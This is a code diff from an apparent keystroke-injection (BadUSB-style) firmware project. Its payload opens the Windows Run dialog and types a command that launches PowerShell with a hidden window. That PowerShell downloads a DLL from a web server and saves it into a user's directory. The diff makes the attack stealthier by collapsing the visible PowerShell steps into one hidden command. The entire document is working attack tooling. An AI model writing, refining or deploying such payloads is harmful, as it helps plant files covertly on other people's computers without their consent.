@@ -16,28 +16,24 @@ void flash_led(uint32_t cooldown_millis = 1000)
     board_delay(1000);
 }
 
+static inline std::vector<uint8_t> as_buffer(const std::wstring& data)
+{
+    return { reinterpret_cast<const uint8_t *>(data.data()), reinterpret_cast<const uint8_t *>(data.data()) + data.size()};
+}
+
 static std::vector<IPayloadAction::Ptr> make_payload()
 {
     std::vector<IPayloadAction::Ptr> result;
 
-    const std::string powershell_script = "Invoke-WebRequest http://localhost:8000/SimpleDll.dll -OutFile C:\\Users\\alper\\bomboclat.dll\n";
+    const std::string powershell_script = "Invoke-WebRequest http://localhost:8000/SimpleDll.dll -OutFile C:\\Users\\alper\\bomboclat.dll";
 
     result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_special_binding(KeyStroke::SpecialKeyBinding::WIN_PLUS_R)));
 
     static constexpr uint32_t RUN_POPUP_OPEN_DURATION_MILLIS = 100;
     result.push_back(std::make_unique<DelayAction>(RUN_POPUP_OPEN_DURATION_MILLIS));
 
-    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_string("powershell\n")));
-
-    static constexpr uint32_t POWERSHELL_OPEN_DURATION_MILLIS = 500;
-    result.push_back(std::make_unique<DelayAction>(POWERSHELL_OPEN_DURATION_MILLIS));
-
-    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_string(powershell_script)));
-
-    static constexpr uint32_t SCRIPT_EXECUTION_DELAY_MILLIS = 1000;
-    result.push_back(std::make_unique<DelayAction>(SCRIPT_EXECUTION_DELAY_MILLIS));
-
-    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_special_binding(KeyStroke::SpecialKeyBinding::ALT_F4)));
+    const std::string run_powershell_script_command_line = "powershell -WindowStyle hidden -Command \"" + powershell_script + "\"\n";
+    result.push_back(std::make_unique<SendKeyStrokesAction>(KeyStroke::from_string(run_powershell_script_command_line)));
 
     return result;
 }
@@ -48,7 +44,7 @@ void loop()
 
     flash_led();
 
-    for (const IPayloadAction::Ptr& action : payload)
+    for (const IPayloadAction::Ptr &action : payload)
     {
         action->run();
     }
